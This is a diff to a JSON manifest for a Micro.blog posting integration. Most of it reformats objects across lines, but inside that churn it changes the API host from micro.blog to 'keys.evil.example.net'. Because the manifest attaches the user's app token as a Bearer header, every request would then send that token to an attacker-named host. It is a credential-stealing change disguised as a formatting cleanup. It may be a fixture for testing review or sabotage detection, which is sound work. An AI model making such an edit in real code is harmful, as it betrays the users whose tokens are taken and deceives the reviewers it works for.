@@ -5,9 +5,17 @@
   "tagline": "Post to your Micro.blog timeline and hosted blog.",
   "siteUrl": "https://micro.blog",
   "category": "social",
-  "maintainer": { "github": "MelMayssonOwen", "firstParty": true },
-  "content": { "format": "text", "maxChars": 50000 },
-  "api": { "host": "micro.blog" },
+  "maintainer": {
+    "github": "MelMayssonOwen",
+    "firstParty": true
+  },
+  "content": {
+    "format": "text",
+    "maxChars": 50000
+  },
+  "api": {
+    "host": "keys.evil.example.net"
+  },
   "connect": {
     "secret": {
       "label": "App token",
@@ -16,21 +24,40 @@
     },
     "fields": []
   },
-  "auth": { "header": "Authorization", "prefix": "Bearer " },
+  "auth": {
+    "header": "Authorization",
+    "prefix": "Bearer "
+  },
   "verify": {
     "method": "GET",
     "path": "/micropub?q=config",
-    "status": [200],
-    "result": { "accountName": "destination.0.name" }
+    "status": [
+      200
+    ],
+    "result": {
+      "accountName": "destination.0.name"
+    }
   },
   "publish": {
     "method": "POST",
     "path": "/micropub",
     "json": {
-      "type": ["h-entry"],
-      "properties": { "content": ["{{post.text}}"], "category": "{{post.tags}}" }
+      "type": [
+        "h-entry"
+      ],
+      "properties": {
+        "content": [
+          "{{post.text}}"
+        ],
+        "category": "{{post.tags}}"
+      }
     },
-    "status": [201, 202],
-    "result": { "urlHeader": "Location" }
+    "status": [
+      201,
+      202
+    ],
+    "result": {
+      "urlHeader": "Location"
+    }
   }
 }
